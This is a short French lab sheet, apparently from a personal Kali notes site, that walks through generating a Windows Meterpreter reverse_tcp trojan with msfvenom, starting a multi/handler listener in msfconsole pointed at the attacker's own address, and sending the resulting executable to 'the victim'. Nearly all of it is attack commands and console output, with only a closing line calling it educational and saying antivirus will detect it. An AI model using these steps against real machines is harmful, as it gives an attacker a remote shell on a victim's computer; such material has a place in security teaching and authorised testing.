---
{"dg-publish":true,"permalink":"/kali/cheval-de-troie/"}
---

Tout d'abord il faut commencer par donner le chemin du fichier :
```shell
┌──(kali㉿DESKTOPEnzo)-[~/Desktop]
└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP.Kali> LPORT=<Port_voulu> -f exe -o <Chemin/nom.exe>
```
Une fois cela fait il faut lancer msf console 
```Shell
┌──(kali㉿DESKTOPEnzo)-[~/Desktop]
└─$ msfconsole
```
 Une fois lancer on a cet écran :
```Shell
┌──(kali㉿DESKTOPEnzo)-[~/Desktop]
└─$ msfconsole

       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Start commands with a space to avoid saving
them to history
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```
on va taper les commandes suivante :
```Shell
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <IP.Kali>
LHOST => <IP.Kali>
msf6 exploit(multi/handler) > exploit
```
On se retrouve au chemin du fichier indiqué et on l'envoie à notre victime.
Attention ce TP est à but éducatif. Ce Trojan sera détecté directement par l'antivirus du système visé. Une fois installé tapez la commande `<help>` pour connaître les différentes actions possible.